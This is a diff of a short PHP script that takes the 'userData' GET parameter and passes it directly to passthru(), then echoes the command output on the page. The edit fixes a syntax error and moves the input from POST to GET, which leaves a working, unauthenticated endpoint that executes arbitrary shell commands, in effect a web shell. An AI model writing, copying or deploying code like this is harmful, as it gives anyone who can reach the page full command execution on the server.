@@ -1,8 +1,8 @@
 <?php
-
+// I am using passthru function in code.
 
 class systemManager{
-  public systemRunCommand($userInputData){
+  public function systemRunCommand($userInputData){
     $response = passthru($userInputData);  
     return $response;
  }
@@ -10,13 +10,12 @@ class systemManager{
 
 
 if($_SERVER['REQUEST_METHOD'] == 'GET'){
-  if(isset($_POST['userData']) && !empty($_POST['userData'])){
-    $userInputData = $_POST['userData'];
-    $systemManager = new systemManager;
-    echo json_encode($systemManager->systemRunCommand());
-    
+  if(isset($_GET['userData']) && !empty($_GET['userData'])){
+    $userInputData = $_GET['userData'];
+    $systemManager = new systemManager; } ?>
+    <pre><?php echo json_encode($systemManager->systemRunCommand($userInputData)); ?></pre>
+  <?php   
   }
-}
   
 ?>
 
